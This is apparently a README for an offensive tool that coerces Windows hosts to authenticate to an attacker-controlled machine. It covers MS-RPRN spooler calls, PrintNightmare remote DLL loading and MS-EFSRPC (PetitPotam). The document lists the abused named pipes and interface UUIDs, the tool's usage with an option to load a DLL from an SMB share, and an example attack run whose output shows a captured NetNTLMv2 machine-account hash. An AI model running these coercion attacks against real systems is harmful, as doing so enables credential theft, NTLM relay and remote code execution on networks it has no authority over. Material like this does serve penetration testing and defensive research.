# Coercion

Coerce Windows hosts to authenticate to other machines.

# Techniques

Coercion of remote systems is not limited to the protocols and functions listed below, there are numerous others as well.

## MS-RPRN

Specifies the Print System Remote Protocol, which defines the communication of print job processing and print system management between a print client and a print server.

The Print System Remote Protocol provides the following functions:
- Management of the print system of a print server from a client.
- Communication of print job data from a client to a print server.
- Notifications to the client of changes in the print server's print system.

Microsoft's Print Spooler is a service that handles various tasks related to document printing. `MS-RPRN` is Microsoft's Print System Remote Protocol. The `RemoteFindFirstPrinterChangeNotificationEx` RPC call is part of the `MS-RPRN` protocol. It defines the communication of print job processing and print system management between a print client and a print server. 

Coercion is triggered by a RPC call to the SMB `\pipe\spoolss` named pipe through the `IPC$` share.

## PrintNightmare

Coercion of the remote system does occur along with remote code execution of a DLL hosted on the SMB server.

## MS-EFSRPC

The Microsoft Encrypting File System Remote (`MS-EFSRPC`) protocol can be used to trigger coercion through the `EfsRpcOpenFileRaw` function.

Coercion is triggered by a RPC call to the SMB `\pipe\LSARPC` named pipe through the `c681d488-d850-11d0-8c52-00c04fd90f7e` interface.

Coercion can also be triggered by a RPC call to the SMB `\pipe\EFSRPC` named pipe through the the `df1941c5-fe89-4e79-bf10-463657acf44d` interface.

**NOTE**: This method is not as prevalent as making calls to the `\pipe\LSARPC` SMB named pipe.

# Usage

```
usage: spool_sploit.py [-h] [--share SHARE] [--lhost LHOST]
                       [-hashes LMHASH:NTHASH] [-port destination port]
                       {spoolsample,nightmare,lsarpc,efsrpc} target

Coerce remote systems to authenticate

positional arguments:
  {spoolsample,nightmare,lsarpc,efsrpc}
                        attack technique to execute
  target                [[domain/]username[:password]@]<targetName or address>

optional arguments:
  -h, --help            show this help message and exit
  --share SHARE         path to DLL (ex: '\\10.1.10.199\share\Program.dll')
  --lhost LHOST         listening hostname or IP
  -port destination port
                        remote SMB server port

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
```

# Example

Start the included SMB server (`smb_server.py`) script to capture the coerced authentication.

```
root@testing:# ./smb_share.py SHARE /tmp
[2021-07-19 22:56:36] [*] Config file parsed
[2021-07-19 22:56:36] [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[2021-07-19 22:56:36] [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[2021-07-19 22:56:36] [*] Config file parsed
[2021-07-19 22:56:36] [*] Config file parsed
[2021-07-19 22:56:36] [*] Config file parsed
...
```

Run `coercion.py` specifying the callback server where the SMB serer is listening.

```
root@testing:# ./coercion.py lsarpc FOO/user1:Password1@10.1.10.201 --lhost 10.1.10.199
[*] 10.1.10.201...connected...exploit success
```

The following response should be received indicating the remote system has authenticated.

```
...
[*] Incoming connection (10.1.10.201,62207)
[*] AUTHENTICATE_MESSAGE (FOO\SYSTEM1$,SYSTEM1)
[*] User SYSTEM1\SYSTEM1$ authenticated successfully
[*] SYSTEM1$::FOO:aaaaaaaaaaaaaaaa:56ac0251e9c3c31d70c53b12339cd0ca:010100000000000000e8fa26c87cd7016f2f1b845ed8edd900000000010010007600620054004f005100500046006e00030010007600620054004f005100500046006e000200100044004e0044005900650075004c0050000400100044004e0044005900650075004c0050000700080000e8fa26c87cd70106000400020000000800300030000000000000000000000000400000f6548ddfa5057090d73f724aae0b1c493729803f3fb606d894d0c4a21e7871a40a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e0031002e0037002e003100390039000000000000000000
[*] NetrGetShareInfo Level: 2
[*] Disconnecting Share(1:IPC$)
[*] Closing down connection (10.1.10.201,62207)
[*] Remaining connections []
...
```

# Resources

- https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1
- https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31
- https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/64ea7ac4-32ef-44f6-ab51-ea2b5a1c2390
- https://gist.github.com/S3cur3Th1sSh1t/d9a71ac641432f64e78a6426b5d0b303
- https://github.com/topotam/PetitPotam